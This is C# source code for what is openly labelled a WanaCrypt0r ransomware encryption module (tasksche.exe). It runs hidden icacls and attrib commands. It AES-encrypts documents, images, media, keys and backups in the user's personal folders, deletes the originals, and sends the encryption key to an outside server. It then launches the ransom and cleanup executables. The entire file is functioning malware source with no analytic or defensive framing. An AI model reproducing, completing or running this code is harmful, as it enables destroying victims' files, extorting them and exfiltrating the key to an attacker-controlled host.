using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

/// <summary>
/// Output: tasksche.exe
/// 
/// 파일 암호화 키 전송 및 파일 암호화
/// 
/// WanaCrypt0r Encrypt Module | Copyright © RHYA.Network 2022
/// </summary>
namespace tasksche
{
    class Program
    {
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        private static extern bool ZeroMemory(IntPtr Destination, int Length);

        private static bool isFreeDecryptCreate = false;
        private static List<string> freeDecryptList = new List<string>();
        private static int freeDecryptCount = 0;

        private static List<string> encryptTargetExt = null;
        private static SecureString encryptKey = null;
        private static byte[] encryptIV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };


        static void Main(string[] args)
        {
            try
            {
                // 암호화 대상 경로
                List<string> encryptTarget = new List<string>();
                // 기본 암호화 대상
                encryptTarget.Add(Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop));
                encryptTarget.Add(Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments));
                encryptTarget.Add(Environment.GetFolderPath(System.Environment.SpecialFolder.MyMusic));
                encryptTarget.Add(Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures));
                encryptTarget.Add(Environment.GetFolderPath(System.Environment.SpecialFolder.MyVideos));
                
                encryptKey = GetSecureString(GenerateRandomText(15));

                // 클라이언트 정보 전송 및 수신
                WebClient webClient = new WebClient();
                string jsonData = webClient.DownloadString(string.Format("https://rhya-network.kro.kr/RhyaNetwork/wanacrypt0r_manager?mode=0&enckey={0}", GetString(encryptKey)));
                webClient.Dispose();

                // 클라이언트 정보 파일 생성
                File.WriteAllText("b.wnry", TextAESEncrypt(jsonData));

                // 암호화 대상 확장자
                encryptTargetExt = new List<string>() {
                    ".hwp", ".ppt", ".pptx", ".show", ".xls", ".xlsx", ".cell", ".eml",
                    ".doc", ".docx", ".pdf", ".txt", ".log", ".html", ".js", ".ico",
                    ".vbs", ".bat", ".cmd", ".sh", ".java", ".class", ".cs", ".m3u",
                    ".xaml", ".fxml", ".xml", ".cpp", ".h", ".php", ".jsp", ".m4u",
                    ".asp", ".c", ".htm", ".png", ".bmp", ".jpg", ".jpeg", ".dch",
                    ".psd", ".pic", ".raw", ".tiff", ".ai", ".svg", ".eps", ".lay6",
                    ".tga", ".avi", ".flv", ".mkv", ".mov", ".mp3", ".mp4", ".odb",
                    ".waw", ".wma", ".ts", ".tp", ".ttf", ".bak", ".bck", "mdb", ".dbf",
                    ".bac", ".zip", ".alz", ".jar", ".rar", ".ini", ".inf", ".accdb",
                    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".sqlitedb",
                    ".odt", ".ott", ".sxw", ".uot", ".3ds", ".max", ".3dm", ".sqlite3",
                    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".sql",
                    ".odp", ".otp", ".vb", ".pas", ".asm", ".pl", ".ps1", ".suo",
                    ".sln", ".rb", ".swf", ".fla", ".mpg", ".vob", ".mpeg", ".3gp",
                    ".3g2", ".mid", ".tif", ".cgm", ".iso", ".7z", ".gz", ".tgz",
                    ".tar", ".tbk", ".bz2", ".paq", ".123", ".csv", ".rtf", ".db",
                    ".docm", ".docb", ".xlsm", ".vcd", ".backup", ".nef", ".djvu", 
                    ".xlw", ".pot", ".snt", ".aspx", ".css", ".class", ".apk", ".pepk",
                    ".egg", ".ztmp", ".yuv", ".ycbcra", ".xxx", ".m4p", ".m4v", ".csl", ".dotx",
                    ".dot", ".hpp", ".cer", ".ce1", ".ce2", ".config", ".dxf", ".ql", ".mpa",
                    ".pps", ".uop", ".wav", ".dat", ".json", ".yml", ".yaml", ".m4a", ".ogg",
                    ".gsm", ".dct", ".flac", ".au", ".aiff", ".aac", ".oma", ".omg", ".atp",
                    ".ape", ".avchd", ".f4v", ".webm", "ts.", ".gif", ".pnm", ".pbm", ".pgm", ".svg"
                };

                // 파일 암호화 대상 경로 리스트
                for (int encryptIndex = 0; encryptIndex < encryptTarget.Count; encryptIndex++)
                {
                    try
                    {
                        EncryptFile(encryptTarget[encryptIndex]);
                    }
                    catch (Exception) {}
                }

                // 암호화 대상 파일 리스트 정보 파일 생성
                using (FileStream fs = new FileStream("a.wnry", FileMode.Create))
                {
                    BinaryFormatter bin = new BinaryFormatter();
                    bin.Serialize(fs, encryptTarget);
                }

                // 무료 복호화 정보 파일 생성
                using (FileStream fs = new FileStream("0000000.bin", FileMode.Create))
                {
                    BinaryFormatter bin = new BinaryFormatter();
                    bin.Serialize(fs, freeDecryptList);
                }
                File.WriteAllText("p.wnry", "0");
                

                encryptKey.Clear();
                encryptIV = null;

                // 파일 실행
                Process.Start("@WanaDecryptor@.exe");
                Process.Start("taskdl.exe");


                // 프로그램 종료
                Environment.Exit(0);
            }
            catch (Exception)
            {
                // 예외 발생
                MessageBox.Show("tasksche.exe를 실행 중 알 수 없는 오류가 발생하였습니다.", "tasksche.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }



        private static void EncryptFile(string path)
        {
            try
            {
                // 현재 사용자가 PC에 대한 모든 파일 접근 권한 부여
                CmdExecute(string.Format("icacls \"{0}\" /grant Everyone:F /T /C /Q", Path.Combine(path, "*.*")));

                // 파일 숨김 및 기타 속성 해제
                CmdExecute(string.Format("ATTRIB -r -a -s -h \"{0}\" /s", Path.Combine(path, "*.*")));

                // 암호화 대상 파일 리스트
                string[] files = Directory.GetFiles(path);

                if (files.Length >= 10)
                    isFreeDecryptCreate = true;

                // 파일 암호화
                foreach (string file in files)
                {
                    try
                    {
                        System.IO.FileInfo fileInfo = new FileInfo(file);

                        foreach (string encryptTargetExt in encryptTargetExt)
                        {
                            if (fileInfo.Extension.ToLower().CompareTo(encryptTargetExt) == 0)
                            {
                                FileAESEncrypt(file, string.Format("{0}.wncry", file));
                                File.Delete(file);
                                break;
                            }
                        }
                    }
                    catch (Exception) { }
                }

                foreach (string dir in Directory.GetDirectories(path))
                    EncryptFile(dir);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        private static SecureString GetSecureString(string source)
        {
            if (string.IsNullOrWhiteSpace(source))
            {
                return null;
            }

            SecureString target = new SecureString();

            foreach (char character in source)
            {
                target.AppendChar(character);
            }

            return target;
        }



        private static string GetString(SecureString source)
        {
            IntPtr targetHandle = IntPtr.Zero;

            try
            {
                targetHandle = Marshal.SecureStringToGlobalAllocUnicode(source);

                return Marshal.PtrToStringUni(targetHandle);
            }
            finally
            {
                Marshal.ZeroFreeGlobalAllocUnicode(targetHandle);
            }
        }



        private static string GenerateRandomText(int strLen)
        {
            try
            {
                int rnum = 0;
                int i, j;
                StringBuilder stringBuilder = new StringBuilder();
                System.Random ranNum = new System.Random();
                for (i = 0; i <= strLen; i++)
                {
                    for (j = 0; j <= 122; j++)
                    {
                        rnum = ranNum.Next(48, 123);
                        if (rnum >= 48 && rnum <= 122 && (rnum <= 57 || rnum >= 65) && (rnum <= 90 || rnum >= 97))
                            break;
                    }
                    stringBuilder.Append(Convert.ToChar(rnum));
                }
                return stringBuilder.ToString();
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        private static byte[] GenerateRandomSalt()
        {
            try
            {
                byte[] data = new byte[32];
                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                    for (int i = 0; i < 10; i++) rng.GetBytes(data);
                return data;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        private static void FileAESEncrypt(string inputFile, string outputFile)
        {
            try
            {
                byte[] salt = GenerateRandomSalt();
                FileStream fsCrypt = new FileStream(outputFile, FileMode.Create);
                byte[] passwordBytes = null;

                if (freeDecryptCount <= 3 && isFreeDecryptCreate)
                {
                    passwordBytes = System.Text.Encoding.UTF8.GetBytes(File.ReadAllText("0000000.xkey"));
                    freeDecryptCount = freeDecryptCount + 1;
                    freeDecryptList.Add(outputFile);

                    isFreeDecryptCreate = false;
                }
                else
                {
                    passwordBytes = System.Text.Encoding.UTF8.GetBytes(GetString(encryptKey));
                }

                RijndaelManaged AES = new RijndaelManaged();
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Padding = PaddingMode.PKCS7;
                AES.Key = passwordBytes;
                AES.IV = encryptIV;
                AES.Mode = CipherMode.CFB;
                fsCrypt.Write(salt, 0, salt.Length);
                CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
                FileStream fsIn = new FileStream(inputFile, FileMode.Open);
                byte[] buffer = new byte[1048576];
                int read;
                try
                {
                    while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cs.Write(buffer, 0, read);
                    }
                    fsIn.Close();
                }
                catch (Exception) { }
                finally
                {
                    cs.Close();
                    fsCrypt.Close();
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        private static string TextAESEncrypt(string str)
        {
            try
            {
                RijndaelManaged aes = new RijndaelManaged();
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = Encoding.UTF8.GetBytes(File.ReadAllText("0000000.xkey"));
                aes.IV = encryptIV;
                var encrypt = aes.CreateEncryptor(aes.Key, aes.IV);
                byte[] xBuff = null;
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encrypt, CryptoStreamMode.Write))
                    {
                        byte[] xXml = Encoding.UTF8.GetBytes(str);
                        cs.Write(xXml, 0, xXml.Length);
                    }
                    xBuff = ms.ToArray();
                }
                return Convert.ToBase64String(xBuff);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        private static void CmdExecute(string cmd)
        {
            System.Diagnostics.ProcessStartInfo pri = new System.Diagnostics.ProcessStartInfo();
            System.Diagnostics.Process pro = new System.Diagnostics.Process();
            pri.FileName = "cmd.exe";
            pri.CreateNoWindow = true;
            pri.UseShellExecute = false;
            pri.RedirectStandardInput = true;
            pri.RedirectStandardOutput = true;
            pri.RedirectStandardError = true;
            pro.StartInfo = pri;
            pro.Start();
            pro.StandardInput.WriteLine(cmd);
            pro.StandardInput.Close();
            pro.WaitForExit();
            pro.Close();
        }
    }
}
